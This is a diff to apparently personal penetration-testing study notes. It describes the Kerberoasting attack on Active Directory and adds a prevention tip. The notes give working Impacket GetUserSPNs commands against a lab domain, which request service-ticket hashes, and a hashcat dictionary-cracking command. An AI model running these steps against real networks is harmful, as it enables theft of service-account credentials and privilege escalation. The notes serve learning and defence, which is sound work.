@@ -47,12 +47,14 @@ General Information:-
 Active Directory Attacks:-
 
 	Kerberoasting: Post exploitation attack, require a valid user (TGT) to request TGS from a service account with SPN and crack the TGS to get the credentials out of it (TGS is encrypted with the NTLM hash of the SPN account password).
-		Tools that can be used 
+		Tools that can be used:-
 			1-Rubeus
 			2-Impacket GetUserSPNs.py
-			3-etc..
+			3-Powershell scripts, etc..
 		Steps:-
 			impacket-GetUserSPNs test.int/yazan:'yazan' -dc-ip 192.168.100.200   //serach for SPN that can help us in escilating priv.
 			impacket-GetUserSPNs test.int/yazan:'yazan' -dc-ip 192.168.100.200 -request -outputfile output.hash // save the hash
 			hashcat --force -m 13100 -a 0 output.hash rockyou.txt //dictionary attack to get the password 
 		
+		Prevention:-
+			Use strong and complex password or host based password insted of user based password.
